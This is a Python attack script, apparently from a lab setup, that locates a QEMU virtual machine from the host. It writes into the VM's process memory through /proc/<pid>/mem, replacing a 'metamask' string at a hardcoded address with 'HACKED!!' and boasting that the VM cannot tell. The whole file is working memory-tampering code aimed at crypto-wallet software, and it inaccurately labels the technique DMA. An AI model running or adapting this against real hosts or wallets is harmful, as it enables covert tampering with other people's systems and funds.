#!/usr/bin/env python3
"""
PASIV Targeted Memory Patcher
Direct DMA attack on specific memory addresses found by the scanner
"""

import os
import sys
import subprocess

class TargetedMemoryPatch:
    def __init__(self):
        self.vm_process = None
        
    def find_vm_process(self):
        """Find the running QEMU VM process"""
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'qemu-system-x86_64' in line and 'ubuntu-desktop-vulnerable' in line:
                    parts = line.split()
                    self.vm_process = int(parts[1])
                    return True
            return False
        except Exception as e:
            print(f"❌ Error finding VM process: {e}")
            return False
    
    def patch_metamask_string(self):
        """Patch the MetaMask string we found in writable memory"""
        target_address = 0x62e6a5491b26  # Address found by scanner
        original_text = "metamask"
        new_text = "HACKED!!"  # Same length for clean replacement
        
        print(f"🎯 Targeting MetaMask string at: 0x{target_address:x}")
        print(f"📝 Changing: '{original_text}' → '{new_text}'")
        
        try:
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                # Seek to the target address
                mem_file.seek(target_address)
                
                # Read the current content to verify
                current_data = mem_file.read(len(original_text))
                current_text = current_data.decode('utf-8', errors='ignore')
                
                print(f"🔍 Current content at target: '{current_text}'")
                
                # Write the new content
                mem_file.seek(target_address)
                new_bytes = new_text.encode('utf-8')
                mem_file.write(new_bytes)
                mem_file.flush()
                
                print(f"✅ Successfully wrote '{new_text}' to memory!")
                
                # Verify the change
                mem_file.seek(target_address)
                verify_data = mem_file.read(len(new_text))
                verify_text = verify_data.decode('utf-8', errors='ignore')
                
                if verify_text == new_text:
                    print(f"✅ Verification SUCCESS: Memory now contains '{verify_text}'")
                    return True
                else:
                    print(f"❌ Verification FAILED: Expected '{new_text}', got '{verify_text}'")
                    return False
                    
        except Exception as e:
            print(f"❌ Error patching memory: {e}")
            return False
    
    def run_targeted_attack(self):
        """Execute the targeted DMA attack"""
        print("🎯 PASIV Targeted Memory Patcher - DMA Attack")
        print("=" * 60)
        
        # Find VM process
        print("🔍 Finding VM process...")
        if not self.find_vm_process():
            print("❌ No running VM found")
            return False
            
        print(f"✅ Found VM process: PID {self.vm_process}")
        
        # Execute the targeted patch
        print(f"\n🚀 Executing DMA attack on MetaMask string...")
        success = self.patch_metamask_string()
        
        if success:
            print(f"\n🚨 DMA ATTACK SUCCESSFUL!")
            print(f"🎯 MetaMask string modified in VM memory!")
            print(f"💀 This demonstrates real-time memory manipulation")
            print(f"🔥 The VM has no idea its memory was modified from the host")
        else:
            print(f"\n❌ DMA attack failed")
            
        return success

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for memory access")
        return 1
        
    patcher = TargetedMemoryPatch()
    success = patcher.run_targeted_attack()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main()) 